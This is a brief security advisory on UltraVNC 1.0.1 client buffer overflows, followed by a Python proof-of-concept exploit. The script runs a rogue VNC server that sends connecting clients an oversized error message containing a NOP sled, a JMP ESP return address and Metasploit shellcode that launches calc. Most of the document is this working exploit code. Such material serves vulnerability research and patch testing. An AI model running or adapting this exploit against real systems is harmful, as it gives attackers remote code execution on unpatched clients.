source: http://www.securityfocus.com/bid/17378/info

UltraVNC is susceptible to multiple error-logging remote buffer-overflow vulnerabilities. These issues are due to the application's failure to properly bounds-check user-supplied input before copying it to insufficiently sized memory buffers.

A successful attack may allow remote attackers to execute arbitrary code on a vulnerable computer to gain unauthorized access in the context of the application.

#!/usr/bin/python

#Ultr@VNC 1.0.1 Client Buffer Overflow - Luigi Auriemm
#POC by Paul Haas at Redspin.com
#Tested on WinXP SP 2: Launches Calc
import socket, struct

HOST = ''                       # Localhost
PORT = 5900                     # VNC Server
BOFSZ = 1024                    # Buffer Size
HEAD = "RFB 003.006\n"          # VNC Header
MESSAGE = "Requires Ultr@VNC Authentication\n"
NOP = "\x90"                    # Standard x86 NOP
JMP = "\xE9\x1B\xFC\xFF\xFF"    # JMP To BUFF
ESP = "\xE0\x3A\xB4\x76"        # winmm.dll: JMP %esp
POP = "PASSWORD"                # RET 8

# win32_exec - CMD=calc Size=160 http://metasploit.com
SHELLCODE = \
"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe1"+\
"\x7c\x05\xd9\x83\xeb\xfc\xe2\xf4\x1d\x94\x41\xd9\xe1\x7c\x8e\x9c"+\
"\xdd\xf7\x79\xdc\x99\x7d\xea\x52\xae\x64\x8e\x86\xc1\x7d\xee\x90"+\
"\x6a\x48\x8e\xd8\x0f\x4d\xc5\x40\x4d\xf8\xc5\xad\xe6\xbd\xcf\xd4"+\
"\xe0\xbe\xee\x2d\xda\x28\x21\xdd\x94\x99\x8e\x86\xc5\x7d\xee\xbf"+\
"\x6a\x70\x4e\x52\xbe\x60\x04\x32\x6a\x60\x8e\xd8\x0a\xf5\x59\xfd"+\
"\xe5\xbf\x34\x19\x85\xf7\x45\xe9\x64\xbc\x7d\xd5\x6a\x3c\x09\x52"+\
"\x91\x60\xa8\x52\x89\x74\xee\xd0\x6a\xfc\xb5\xd9\xe1\x7c\x8e\xb1"+\
"\xdd\x23\x34\x2f\x81\x2a\x8c\x21\x62\xbc\x7e\x89\x89\x8c\x8f\xdd"+\
"\xbe\x14\x9d\x27\x6b\x72\x52\x26\x06\x1f\x64\xb5\x82\x7c\x05\xd9"

#buff = MESSAGE+SHELLCODE+NOP SLED+RET ADDR+USELESS+JUMP TO BUFF
buff = MESSAGE+SHELLCODE+NOP*(BOFSZ-11-len(MESSAGE)-len(SHELLCODE))
buff = buff+ESP+POP+JMP

#Egg = VNC Server Error Reply and Size of Reply + buff
egg = struct.pack('LL',socket.htonl(0),socket.htonl(len(buff)))+buff

print 'Ultr@VNC 1.0.1 Client Buffer Overflow - Luigi Auriemma'
print 'POC by Paul Haas at Redspin.com'
print 'Server listening on port', PORT

#Server Loop
while(1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((HOST, PORT))
        s.listen(1)

        conn, addr = s.accept()
        print 'Connection by', addr

        conn.send(HEAD)
        data = conn.recv(12)

        conn.send(egg)
        conn.close()